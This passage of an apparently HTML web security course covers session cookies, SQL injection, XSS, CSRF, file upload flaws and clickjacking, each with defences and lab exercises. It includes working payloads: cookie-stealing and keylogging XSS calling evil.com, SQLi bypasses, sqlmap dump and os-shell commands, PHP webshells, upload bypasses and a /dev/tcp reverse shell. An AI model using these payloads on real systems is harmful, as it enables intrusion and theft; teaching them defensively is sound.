+      <div class="flow">
+        <div class="fn s">User logs in with credentials</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Server validates credentials → creates session in DB</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Server sends: Set-Cookie: session=RANDOM_TOKEN; HttpOnly; Secure; SameSite=Strict</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Browser sends cookie with every request to that domain</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Server looks up session in DB → knows who you are</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn w">On logout: server DELETES session from DB (not just cookie)</div>
+      </div>
+    </div>
+    <div class="sub"><h3>Session Attacks &amp; Defences</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Attack</th><th>How It Works</th><th>Prevention</th></tr></thead>
+        <tbody>
+          <tr><td>Session Fixation</td><td>Attacker sets victim's session ID before login; after login, attacker uses same ID</td><td>Regenerate session ID on login</td></tr>
+          <tr><td>Session Hijacking</td><td>Steal valid session cookie via XSS, sniffing, or MitM</td><td>HttpOnly, Secure flags; short timeouts; bind to IP/UA</td></tr>
+          <tr><td>Session Prediction</td><td>Predictable/sequential session IDs; attacker guesses next valid ID</td><td>Use cryptographically random IDs (128+ bits)</td></tr>
+          <tr><td>CSRF</td><td>Force authenticated user's browser to make requests to the app</td><td>CSRF tokens + SameSite=Strict</td></tr>
+          <tr><td>Session Timeout Bypass</td><td>Reuse expired session if server doesn't check expiry</td><td>Server-side timeout; absolute + idle timeouts</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Cookie Security Flags — Deep Dive</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">COOKIE SECURITY FLAGS</div></div>
+        <div class="term-body"><pre><span class="cm"># ── Insecure cookie (all flags missing) ──</span>
+<span class="err">Set-Cookie: session=abc123</span>
+<span class="cm"># JS can read it → XSS steals cookie: document.cookie
+# Sent over HTTP → MitM can intercept
+# Sent cross-site → CSRF possible</span>
+
+<span class="cm"># ── Fully hardened cookie ──</span>
+<span class="cg">Set-Cookie: session=RANDOM256BITHEX; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600</span>
+
+<span class="cy">HttpOnly</span>     → JS CANNOT read this cookie (document.cookie returns "")
+              Prevents XSS cookie theft completely
+              ALWAYS set on session cookies
+
+<span class="cy">Secure</span>       → Cookie ONLY sent over HTTPS connections
+              Prevents MitM interception on HTTP
+              ALWAYS set in production
+
+<span class="cy">SameSite=Strict</span>  → Cookie NOT sent on cross-site requests at all
+              Prevents CSRF completely
+              May break some OAuth flows (use Lax for those)
+
+<span class="cy">SameSite=Lax</span>     → Sent on same-site + top-level GET navigations
+              Default in modern browsers if not specified
+              Protects from CSRF POST attacks
+
+<span class="cy">SameSite=None; Secure</span>  → Required for cross-site cookies (3rd party)
+              e.g. embedded payment widgets, OAuth
+
+<span class="cy">Max-Age=3600</span>  → Session expires after 1 hour (absolute expiry)
+<span class="cy">Path=/</span>        → Cookie sent for all paths on domain
+<span class="cy">Domain</span>        → Don't set (limits to exact domain, not subdomains)
+
+<span class="cm"># ── Steal cookie via XSS (without HttpOnly) ──</span>
+<span class="err">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+<span class="cm"># With HttpOnly set: document.cookie = "" → cannot steal!</span>
+
+<span class="cm"># ── Check cookies with Burp Suite ──</span>
+<span class="cm"># Proxy tab → Intercept login response</span>
+<span class="cm"># Look at Set-Cookie header → verify all flags present</span>
+<span class="cm"># Cookie jar: Target → Site Map → right-click → Cookie jar</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Using browser DevTools (F12 → Application → Cookies), inspect the cookies on a website you use. Do they have HttpOnly, Secure, and SameSite flags set?</li>
+      <li>Explain session fixation: how does the attacker set the victim's session ID? At what point should the server regenerate the session ID?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Session management and cookie security are inseparable. Always use cryptographically random session IDs (128+ bits), set all three security flags (HttpOnly+Secure+SameSite=Strict), implement server-side timeouts, and regenerate session ID on login. A stolen session cookie grants complete account access without knowing the password.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T113 ===== -->
+<div class="sgt">💉 Injection Attacks</div>
+<div class="sec" id="t113">
+  <div class="sh"><span class="sn">Topic 113</span><h2>SQL Injection</h2><span class="badge b-r">CRITICAL</span><span class="se">💉</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>SQLi inserts malicious SQL into user input to manipulate database queries — allowing attackers to extract, modify, or delete data, or bypass authentication entirely.</div>
+    <div class="sub"><h3>Definition &amp; Types</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>SQL Injection (SQLi)</strong> occurs when user-supplied input is inserted directly into an SQL query without proper sanitisation, allowing an attacker to alter the query's logic. It is consistently OWASP #1 or #3 — the most impactful web vulnerability affecting databases.
+      </div>
+    </div>
+    <div class="sub"><h3>SQLi Types — Full Deep Dive</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">SQL INJECTION — COMPLETE ATTACK GUIDE</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ TYPE 1: IN-BAND SQLi (Error-based + Union-based) ━━━━━━━━━━━━</span>
+
+<span class="cm"># Vulnerable PHP code:</span>
+<span class="err">$query = "SELECT * FROM users WHERE username='$_POST[user]' AND password='$_POST[pass]'";</span>
+
+<span class="cm"># Authentication bypass (classic):</span>
+<span class="fl">Username:</span> <span class="err">admin'--</span>
+<span class="fl">Password:</span> anything
+<span class="cm"># Query becomes:</span>
+<span class="cm"># SELECT * FROM users WHERE username='admin'--' AND password='anything'</span>
+<span class="cm"># '--' comments out password check → logs in as admin!</span>
+
+<span class="cm"># Alternative bypasses:</span>
+<span class="err">admin' OR '1'='1'--</span>       <span class="cm"># Always true → login as first user</span>
+<span class="err">admin'/*</span>                   <span class="cm"># MySQL block comment</span>
+<span class="err">' OR 1=1#</span>                 <span class="cm"># MySQL hash comment</span>
+<span class="err">'; DROP TABLE users;--</span>    <span class="cm"># Classic SQL injection (Bobby Tables!)</span>
+
+<span class="cm"># UNION-based: Extract data from other tables</span>
+<span class="cm"># Step 1: Find number of columns</span>
+<span class="fl">GET /products?id=1 ORDER BY 1--</span>  <span class="cm"># Works</span>
+<span class="fl">GET /products?id=1 ORDER BY 2--</span>  <span class="cm"># Works</span>
+<span class="err">GET /products?id=1 ORDER BY 3--</span>  <span class="cm"># Error! → 2 columns exist</span>
+
+<span class="cm"># Step 2: UNION to extract passwords</span>
+<span class="err">GET /products?id=-1 UNION SELECT username,password FROM users--</span>
+<span class="cm"># Response shows usernames and passwords!</span>
+
+<span class="cm">━━━ TYPE 2: BLIND SQLi (Boolean + Time-based) ━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># No data returned — infer from true/false responses or time delays</span>
+
+<span class="cm"># Boolean-based (different response for true/false):</span>
+<span class="fl">GET /user?id=1 AND 1=1--</span>     <span class="cm"># Normal response (true)</span>
+<span class="fl">GET /user?id=1 AND 1=2--</span>     <span class="cm"># Different/empty response (false)</span>
+<span class="cm"># Bit by bit, extract database contents!</span>
+<span class="err">GET /user?id=1 AND SUBSTRING(username,1,1)='a'--</span>  <span class="cm"># First char = 'a'?</span>
+
+<span class="cm"># Time-based (no visual difference — use timing):</span>
+<span class="err">GET /user?id=1; IF(1=1,SLEEP(5),0)--</span>     <span class="cm"># 5 second delay = TRUE</span>
+<span class="err">GET /user?id=1; IF(1=2,SLEEP(5),0)--</span>     <span class="cm"># Instant = FALSE</span>
+
+<span class="cm">━━━ SQLMAP — AUTOMATED SQLi TOOL ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/item?id=1"</span>             <span class="cm"># Basic test</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/item?id=1" --dbs</span>       <span class="cm"># List databases</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/item?id=1" -D shop --tables</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/item?id=1" -D shop -T users --dump</span>
+<span class="out">Database: shop
+Table: users
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | (MD5: "password")
+| 2  | alice    | e10adc3949ba59abbe56e057f20f883e |</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/login" --data="user=admin&amp;pass=test" --dbs</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "http://target.com/item?id=1" --os-shell</span>  <span class="cm"># Get OS shell (if permissions allow!)</span></pre></div>
+      </div>
+    </div>
+    <div class="ad-grid">
+      <div class="atk-box"><h4>⚔️ SQLi Techniques</h4><ul>
+        <li><code>' OR '1'='1'--</code> auth bypass</li>
+        <li>UNION SELECT to extract other tables</li>
+        <li>SLEEP(5) for blind time-based</li>
+        <li>LOAD_FILE() to read server files</li>
+        <li>INTO OUTFILE to write files (webshell!)</li>
+        <li>sqlmap --os-shell for RCE</li>
+      </ul></div>
+      <div class="def-box"><h4>🛡️ SQLi Defences</h4><ul>
+        <li>Parameterised queries / Prepared Statements (primary!)</li>
+        <li>Stored procedures with input binding</li>
+        <li>ORM frameworks (Hibernate, SQLAlchemy)</li>
+        <li>Input validation + whitelist</li>
+        <li>Least privilege DB user (no DROP permission)</li>
+        <li>WAF as additional layer (not sole defence)</li>
+      </ul></div>
+    </div>
+    <div class="sub"><h3>Parameterised Queries — The Fix</h3>
+      <div class="cb"><div class="clbl">PARAMETERISED QUERIES</div><pre><span class="cm"># ── VULNERABLE (string concatenation) ──</span>
+<span class="cr">$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";</span>
+<span class="cm"># User inputs: admin'-- → query broken!</span>
+
+<span class="cm"># ── SECURE (parameterised) ──</span>
+<span class="cm"># PHP PDO:</span>
+<span class="cg">$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_POST['user']]);  // Input treated as DATA, never as SQL</span>
+
+<span class="cm"># Python (sqlite3):</span>
+<span class="cg">cursor.execute("SELECT * FROM users WHERE username = ?", (username,))</span>
+
+<span class="cm"># Java (PreparedStatement):</span>
+<span class="cg">PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
+stmt.setString(1, username);  // '1' binds to first ? — never interpreted as SQL</span>
+
+<span class="cm"># Node.js (mysql2):</span>
+<span class="cg">db.query("SELECT * FROM users WHERE username = ?", [username], callback);</span>
+
+<span class="cm"># WHY it works: the parameter is sent separately to the DB engine
+# The DB KNOWS it's data, not SQL — it cannot break out of the parameter boundary</span></pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Use DVWA (Damn Vulnerable Web App) at low security. Try the SQL injection challenge. Extract the admin password hash using UNION SELECT.</li>
+      <li>Run <code>sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs</code>. What databases exist?</li>
+      <li>Why does a parameterised query prevent SQL injection even when the input contains <code>' OR '1'='1</code>?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>SQL injection has caused some of the largest data breaches in history. The fix is simple: <strong>always use parameterised queries</strong> — every language and framework supports them. There is no excuse for SQLi in 2024. A single parameterised query template replaces hundreds of input validation rules.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T114 ===== -->
+<div class="sec" id="t114">
+  <div class="sh"><span class="sn">Topic 114</span><h2>Cross-Site Scripting (XSS)</h2><span class="badge b-r">CRITICAL</span><span class="se">📜</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>XSS injects malicious JavaScript into web pages — running in victims' browsers to steal cookies, redirect users, log keystrokes, or perform actions on their behalf.</div>
+    <div class="sub"><h3>XSS Types — Complete Breakdown</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">XSS TYPES — ATTACK + TEST PAYLOADS</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ TYPE 1: REFLECTED XSS (Non-persistent) ━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Input reflected immediately in response, not stored</span>
+<span class="cm"># Attacker sends victim a crafted URL</span>
+
+<span class="cm"># Vulnerable URL:</span>
+<span class="err">https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="cm"># Server reflects: "Results for: &lt;script&gt;alert('XSS')&lt;/script&gt;"</span>
+<span class="cm"># Browser executes script — alert box pops!</span>
+
+<span class="cm"># Real attack — steal session cookie:</span>
+<span class="err">https://site.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="cm">━━━ TYPE 2: STORED XSS (Persistent) — Most Dangerous ━━━━━━━━━━</span>
+<span class="cm"># Malicious script stored in database, served to all visitors</span>
+<span class="cm"># E.g., comment section, forum post, profile name</span>
+
+<span class="cm"># Attacker posts this as a comment:</span>
+<span class="err">Nice article! &lt;script&gt;fetch('https://evil.com/c?k='+document.cookie)&lt;/script&gt;</span>
+<span class="cm"># Every user who views the page has their cookie stolen!</span>
+
+<span class="cm">━━━ TYPE 3: DOM-BASED XSS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Payload executed by client-side JavaScript, never touches server</span>
+<span class="cm"># Vulnerable JS code:</span>
+<span class="err">document.getElementById('msg').innerHTML = location.hash.substring(1);</span>
+<span class="cm"># URL: https://site.com/page#&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="cm"># hash value injected into innerHTML → executes!</span>
+
+<span class="cm">━━━ XSS PAYLOAD EXAMPLES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cg">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>                   <span class="cm"># Basic test</span>
+<span class="cg">&lt;img src=x onerror=alert(document.domain)&gt;</span>         <span class="cm"># Image error event</span>
+<span class="cg">&lt;svg/onload=alert(1)&gt;</span>                              <span class="cm"># SVG event</span>
+<span class="cg">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>                       <span class="cm"># Break out of attribute</span>
+<span class="cg">javascript:alert(1)</span>                                <span class="cm"># In href attribute</span>
+<span class="cg">&lt;iframe src="javascript:alert(1)"&gt;</span>                 <span class="cm"># iframe src</span>
+<span class="cg">'&gt;&lt;svg onload=alert`1`&gt;</span>                           <span class="cm"># Template literal (CSP bypass)</span>
+
+<span class="cm"># Advanced: Keylogger via XSS</span>
+<span class="cg">&lt;script&gt;
+document.addEventListener('keypress', function(e){
+  fetch('https://evil.com/keys?k='+e.key);
+});
+&lt;/script&gt;</span>
+
+<span class="cm"># BeEF (Browser Exploitation Framework) — XSS command and control:</span>
+<span class="cg">&lt;script src="http://attacker:3000/hook.js"&gt;&lt;/script&gt;</span>
+<span class="cm"># Victim's browser becomes a zombie — attacker can take screenshots,</span>
+<span class="cm"># redirect browser, scan network, steal credentials via fake popups</span>
+
+<span class="cm">━━━ XSS TESTING WITH TOOLS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dalfox url "https://target.com/search?q=test"</span>  <span class="cm"># XSS scanner</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">xsser -u "https://target.com/search?q=" -p XSS</span>
+<span class="cm"># In Burp Suite: use XSS payloads in Intruder attack on input fields</span></pre></div>
+      </div>
+    </div>
+    <div class="ad-grid">
+      <div class="atk-box"><h4>⚔️ XSS Capabilities</h4><ul>
+        <li>Steal session cookies → account takeover</li>
+        <li>Keylogger → capture passwords as typed</li>
+        <li>Screenshot browser tab</li>
+        <li>Redirect to phishing site</li>
+        <li>Cryptomining in victim's browser</li>
+        <li>Port scan victim's internal network (via fetch)</li>
+      </ul></div>
+      <div class="def-box"><h4>🛡️ XSS Defences</h4><ul>
+        <li>Output encoding: HTML entities for all user data</li>
+        <li>Content Security Policy (CSP) header</li>
+        <li>HttpOnly cookies (stops cookie theft)</li>
+        <li>DOM API: textContent not innerHTML</li>
+        <li>Input validation + sanitisation (DOMPurify)</li>
+        <li>Trusted Types API (modern browsers)</li>
+      </ul></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>On DVWA (XSS-Reflected, low security), inject <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>. Can you see your session cookie? Now set HttpOnly on the cookie — can you still steal it?</li>
+      <li>What is the difference between <code>innerHTML</code> and <code>textContent</code> in JavaScript? Which is safer and why?</li>
+      <li>Write a CSP header that would prevent all external scripts while allowing inline event handlers. Then explain why inline event handlers in CSP are dangerous.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>XSS is the most common web vulnerability. Stored XSS is particularly dangerous — a single injection can steal cookies from every visitor. The primary defences are output encoding (context-aware) and a strict CSP header. The combination of HttpOnly cookies + strong CSP eliminates most XSS impact.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T115 ===== -->
+<div class="sec" id="t115">
+  <div class="sh"><span class="sn">Topic 115</span><h2>CSRF — Cross-Site Request Forgery</h2><span class="badge b-o">HIGH</span><span class="se">🎣</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>CSRF tricks an authenticated user's browser into making unwanted requests to a trusted site — the browser auto-sends cookies, so the server thinks the action is legitimate.</div>
+    <div class="sub"><h3>CSRF Attack — Step by Step</h3>
+      <div class="cb"><div class="clbl">CSRF ATTACK WALKTHROUGH</div><pre><span class="cm"># SCENARIO: Victim is logged into their bank at bank.com</span>
+<span class="cm"># The bank has a vulnerable money transfer endpoint:</span>
+<span class="fl">POST /transfer
+Body: to=attacker&amp;amount=10000</span>
+<span class="cm"># Server processes this if the request has a valid session cookie</span>
+<span class="cm"># The browser ALWAYS sends session cookie for bank.com automatically!</span>
+
+<span class="cm">━━━ ATTACK ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Attacker hosts evil.com with hidden form:</span>
+<span class="cr">&lt;html&gt;
+&lt;body onload="document.csrf.submit()"&gt;
+  &lt;form name="csrf" action="https://bank.com/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="to" value="attacker_account"&gt;
+    &lt;input type="hidden" name="amount" value="10000"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</span>
+
+<span class="cm"># Attacker sends victim a link to evil.com
+# Victim's browser (logged into bank.com) visits evil.com
+# evil.com auto-submits form to bank.com
+# Browser automatically includes bank.com session cookie!
+# Bank sees valid session + transfer request → transfers money!
+# Victim has no idea this happened.</span>
+
+<span class="cm"># GET-based CSRF (even simpler):</span>
+<span class="cr">&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;</span>
+<span class="cm"># Just loading evil.com triggers the bank transfer!</span>
+
+<span class="cm">━━━ CSRF TOKEN DEFENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Server generates random CSRF token per session, embeds in form:</span>
+<span class="cg">&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="csrf_token" value="RANDOM_UNGUESSABLE_TOKEN"&gt;
+  ...
+&lt;/form&gt;</span>
+
+<span class="cm"># Server validates token on submit — attacker cannot know this token!
+# Same-origin policy prevents evil.com reading bank.com's HTML
+# → attacker cannot extract the CSRF token</span>
+
+<span class="cm"># SameSite=Strict also prevents CSRF (cookie not sent cross-site):
+Set-Cookie: session=abc; SameSite=Strict</span>
+
+<span class="cm"># Double Submit Cookie pattern:
+# - Server sets CSRF cookie + CSRF hidden field with same random value
+# - JS reads cookie, sets form field (works because attacker can't read cookies)
+# - Server compares both values</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why can't an attacker just read the CSRF token from the victim's page to include it in the forged request?</li>
+      <li>Explain why SameSite=Strict prevents CSRF. What happens if you set SameSite=None — is CSRF now possible?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>CSRF exploits the fact that browsers automatically send credentials (cookies) with every request to a domain. Defence: CSRF tokens (the server validates a secret the attacker cannot know) + SameSite=Strict cookies. Modern browsers defaulting to SameSite=Lax have significantly reduced CSRF prevalence.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T116 ===== -->
+<div class="sec" id="t116">
+  <div class="sh"><span class="sn">Topic 116</span><h2>File Upload Vulnerability</h2><span class="badge b-r">CRITICAL</span><span class="se">📁</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Unrestricted file uploads let attackers upload malicious files (PHP webshells, polyglots, malware) to execute arbitrary code on the server — the most direct path to Remote Code Execution (RCE).</div>
+    <div class="sub"><h3>File Upload Attack Chain</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">FILE UPLOAD RCE — ATTACK + BYPASS TECHNIQUES</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ BASIC WEBSHELL UPLOAD ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Simple PHP webshell (one-liner):</span>
+<span class="cr">&lt;?php system($_GET['cmd']); ?&gt;</span>
+<span class="cm"># Save as: shell.php
+# Upload to vulnerable site
+# Visit: https://target.com/uploads/shell.php?cmd=id
+# Response: uid=33(www-data) gid=33(www-data) — RCE!</span>
+
+<span class="cm"># More advanced webshell:</span>
+<span class="cr">&lt;?php echo shell_exec($_POST['cmd']); ?&gt;</span>
+
+<span class="cm">━━━ BYPASS TECHNIQUES (when filtering exists) ━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Client-side filtering bypass:</span>
+<span class="fl">1. Intercept with Burp Suite
+2. Change filename: shell.jpg → shell.php AFTER upload bypass</span>
+
+<span class="cm"># Magic bytes bypass (server checks file content):</span>
+<span class="cm"># Add JPEG magic bytes at start of PHP file:</span>
+<span class="fl">FF D8 FF E0</span> <span class="cr">&lt;?php system($_GET['cmd']); ?&gt;</span>
+<span class="cm"># File looks like JPEG but contains PHP code</span>
+
+<span class="cm"># Extension bypass:</span>
+<span class="cr">shell.php</span>     → blocked
+<span class="fl">shell.pHp</span>    → case variation
+<span class="fl">shell.php5</span>   → alternative extension
+<span class="fl">shell.phtml</span>  → another PHP extension
+<span class="fl">shell.php.jpg</span> → double extension (if only checks last part)
+<span class="fl">shell.php%00.jpg</span> → null byte (truncates at %00 in old PHP)
+
+<span class="cm"># MIME type bypass:</span>
+<span class="cm"># Burp Suite: Change Content-Type from application/x-php to image/jpeg</span>
+<span class="fl">Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg   ← Changed to bypass MIME check</span>
+
+<span class="cm"># Directory traversal in filename:</span>
+<span class="cr">../../../var/www/html/shell.php</span>  <span class="cm"># Upload outside intended directory</span>
+
+<span class="cm">━━━ EXPLOITATION AFTER UPLOAD ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Via webshell:</span>
+<span class="fl">https://target.com/uploads/shell.php?cmd=whoami</span>
+<span class="fl">https://target.com/uploads/shell.php?cmd=cat+/etc/passwd</span>
+<span class="fl">https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html</span>
+
+<span class="cm"># Reverse shell via webshell:</span>
+<span class="fl">cmd=bash+-c+'bash+-i+>%26+/dev/tcp/attacker_ip/4444+0>%261'</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nc -lvnp 4444</span>  <span class="cm"># Listen for reverse shell connection</span></pre></div>
+      </div>
+    </div>
+    <div class="ad-grid">
+      <div class="atk-box"><h4>⚔️ Upload Attacks</h4><ul>
+        <li>PHP/ASP webshell for command execution</li>
+        <li>Overwrite existing files (../../config.php)</li>
+        <li>Upload HTML/JS for stored XSS</li>
+        <li>Polyglot files (valid image + PHP code)</li>
+        <li>ZIP slip (path traversal in archives)</li>
+        <li>SVG with embedded XSS script</li>
+      </ul></div>
+      <div class="def-box"><h4>🛡️ Upload Defences</h4><ul>
+        <li>Allowlist file extensions (NOT blacklist)</li>
+        <li>Check magic bytes (not just extension/MIME)</li>
+        <li>Store uploads OUTSIDE web root (not /var/www/html)</li>
+        <li>Rename file server-side (random UUID)</li>
+        <li>Strip metadata (exiftool); re-encode images</li>
+        <li>Serve from CDN with no execution permission</li>
+      </ul></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>On DVWA (File Upload, low security): upload a PHP webshell. Visit the uploaded file's URL with <code>?cmd=id</code>. What user is the web server running as?</li>
+      <li>Why should uploaded files be stored OUTSIDE the web root, even if execution is disabled?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>File upload vulnerabilities can lead directly to complete server compromise via RCE. Never trust client-supplied file types. The combination of: allowlist extensions + magic byte validation + outside-webroot storage + UUID renaming + CDN delivery makes file upload attacks practically impossible.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T117 + T118 ===== -->
+<div class="sec" id="t117">
+  <div class="sh"><span class="sn">Topics 117–118</span><h2>Clickjacking &amp; Session Hijacking</h2><span class="se">🖱️</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Clickjacking overlays invisible iframes to trick users into clicking hidden buttons; session hijacking steals authenticated session tokens to impersonate users without their password.</div>
+    <div class="sub"><h3>Clickjacking</h3>
+      <div class="cb"><div class="clbl">CLICKJACKING ATTACK</div><pre><span class="cm"># Attacker overlays transparent iframe of victim site over their page:</span>
+<span class="cr">&lt;style&gt;
+  iframe {
+    position: absolute;
+    width: 500px; height: 700px;
+    opacity: 0.0;   /* INVISIBLE — victim can't see it */
+    top: 100px; left: 150px;
+    z-index: 100;
+  }
+  .decoy-btn {
+    position: absolute;
+    top: 340px; left: 190px;  /* Positioned behind iframe's "Transfer" button */
+  }
+&lt;/style&gt;
+
+&lt;iframe src="https://bank.com/transfer?to=attacker&amp;amount=5000"&gt;&lt;/iframe&gt;
+&lt;button class="decoy-btn"&gt;Click here to claim your prize!&lt;/button&gt;</span>
+
+<span class="cm"># Victim sees "Win a prize" button
+# Actually clicks bank's invisible "Transfer" button → money transferred!
+
+# Defences:</span>
+<span class="cg">X-Frame-Options: DENY</span>                           <span class="cm"># Cannot be embedded in any iframe</span>
+<span class="cg">X-Frame-Options: SAMEORIGIN</span>                      <span class="cm"># Only same-origin iframes</span>
+<span class="cg">Content-Security-Policy: frame-ancestors 'none';</span>  <span class="cm"># Modern CSP equivalent</span></pre></div>
+    </div>
+    <div class="sub"><h3>Session Hijacking Methods</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Method</th><th>How Cookie/Session is Stolen</th><th>Prevention</th></tr></thead>
+        <tbody>
+          <tr><td>XSS theft</td><td>Injected JS reads document.cookie → sends to attacker</td><td>HttpOnly flag on cookies</td></tr>
+          <tr><td>Network sniffing</td><td>HTTP sniffed — cookie visible in plain text</td><td>HTTPS + Secure cookie flag</td></tr>
+          <tr><td>MitM (ARP spoof)</td><td>Intercept HTTPS after SSL strip attack</td><td>HSTS + proper TLS</td></tr>
+          <tr><td>Predictable tokens</td><td>Guess sequential or time-based session IDs</td><td>Cryptographically random IDs</td></tr>
+          <tr><td>Log/URL leakage</td><td>Session ID in URL → appears in Referrer header, server logs, browser history</td><td>Never put session ID in URL</td></tr>
+          <tr><td>Browser storage theft</td><td>Token in localStorage stolen via XSS</td><td>Use HttpOnly cookie, not localStorage</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Create an HTML page with a transparent iframe over a button. Verify that X-Frame-Options: DENY prevents the iframe from loading.</li>
+      <li>Why is storing JWT tokens in localStorage vulnerable to XSS, but storing them in HttpOnly cookies is not?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Clickjacking is prevented by a single HTTP header (X-Frame-Options or CSP frame-ancestors). Session hijacking requires defence at multiple layers: HTTPS, HttpOnly cookies, short timeouts, and binding sessions to additional factors like IP/User-Agent. Both are easy to prevent and inexcusable when left unpatched.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T119 ===== -->
+<div class="sgt">🔥 Advanced Web Vulnerabilities</div>
+<div class="sec" id="t119">
+  <div class="sh"><span class="sn">Topic 119 🔥</span><h2>IDOR — Insecure Direct Object Reference</h2><span class="badge b-r">HIGH</span><span class="se">🔢</span></div>
+  <div class="sb">
